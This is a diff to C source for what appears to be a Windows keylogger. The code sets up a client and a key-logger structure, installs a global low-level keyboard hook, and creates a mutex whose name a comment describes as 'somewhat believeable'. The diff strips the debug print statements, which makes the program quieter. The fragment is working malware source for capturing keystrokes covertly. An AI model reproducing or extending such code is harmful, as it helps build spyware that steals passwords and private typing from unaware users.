@@ -48,19 +48,17 @@ RET_CODE setup() {
  */
 static PROGRAM_CONTEXT* initProgramContext() {
     PROGRAM_CONTEXT* prCon = malloc(sizeof(PROGRAM_CONTEXT));
-    if (prCon == NULL) { printf("A\n"); return NULL; }
+    if (prCon == NULL) { return NULL; }
 
     // create client structure
     prCon->client = initClient();
     if (prCon->client == NULL) {
-        printf("B\n");
         free(prCon);
         return NULL;
     }
     // create key logger structure
     prCon->kLogger = initKeyLogger();
     if (prCon->kLogger == NULL) {
-        printf("D\n");
         free(prCon->client);
         free(prCon);
         return NULL;
@@ -68,14 +66,12 @@ static PROGRAM_CONTEXT* initProgramContext() {
     // install the LowLevelKeyboardProc and set the hook
     prCon->hLowLevelKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
     if (prCon->hLowLevelKeyHook == NULL) {
-        printf("E\n");
         programContextCleanup(prCon);
         return NULL;
     }
     // create mutex and check if it already exists, use a somewhat believeable name :)
     prCon->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
     if (prCon->hMutexThreadSync == NULL || GetLastError() == ERROR_ALREADY_EXISTS)  {
-        printf("F\n");
         programContextCleanup(prCon);
         return NULL;
     }
